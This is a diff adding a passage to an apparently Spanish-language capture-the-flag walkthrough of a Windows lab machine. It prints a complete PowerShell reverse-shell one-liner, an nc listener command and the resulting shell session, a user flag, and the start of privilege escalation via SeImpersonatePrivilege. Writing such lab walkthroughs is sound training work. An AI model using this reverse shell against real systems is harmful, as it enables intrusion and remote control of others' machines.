@@ -256,3 +256,52 @@ win-4qu3qnhnk7e\info
 
 Vemos que esta funcionando de forma correcta, por lo que vamos a ingresar el siguiente `payload` para obtener una `shell` con la maquina victima.
 
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Antes de ejecutar esto en la pagina, nos pondremos a la escucha:
+
+```shell
+nc -lvnp <PORT>
+```
+
+Ahora lo enviamos y si volvemos a donde tenemos la escucha veremos lo siguiente:
+
+```
+listening on [any] 7777 ...
+connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49161
+PS C:\windows\system32\inetsrv> whoami
+win-4qu3qnhnk7e\info
+```
+
+Veremos que ha funcionado por lo que leeremos la `flag` del usuario.
+
+> user.txt
+
+```
+uigsg5sdfdfbv5b6sad98vcdf
+```
+
+## Escalate Privileges
+
+Vamos a ver que privilegios tenemos:
+
+```powershell
+whoami /priv
+```
+
+Info:
+
+```
+INFORMACI?N DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripci?n                                  Estado       
+============================= ============================================ =============
+SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
+```
+
+Vemos que `SeImpersonatePrivilege` esta `habilitado` por lo que podremos
